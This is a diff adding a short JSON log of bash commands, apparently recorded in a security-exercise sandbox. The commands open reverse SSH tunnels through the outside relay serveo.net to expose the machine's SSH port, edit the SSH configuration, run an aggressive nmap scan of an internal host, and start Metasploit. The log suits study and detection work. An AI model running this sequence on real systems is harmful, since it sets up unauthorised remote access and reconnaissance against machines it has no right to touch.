@@ -1,0 +1,8 @@
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:34:14.131195+02:00", "cmd_type": "bash-command", "cmd": "ssh -R blabla:22:127.0.0.1:22 serveo.net"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:34:54.276481+02:00", "cmd_type": "bash-command", "cmd": "ssh -R 6666:127.0.0.1:22 serveo.net"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:35:46.970092+02:00", "cmd_type": "bash-command", "cmd": "vim /etc/ssh/sshd_config"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:36:05.176747+02:00", "cmd_type": "bash-command", "cmd": "systemctl restart ssh"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:36:33.514884+02:00", "cmd_type": "bash-command", "cmd": "vim"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:36:36.103732+02:00", "cmd_type": "bash-command", "cmd": "ll"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:36:54.269733+02:00", "cmd_type": "bash-command", "cmd": "nmap -p 10000 -A 172.18.1.5"}
+{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:39:45.308281+02:00", "cmd_type": "bash-command", "cmd": "msfconsole"}
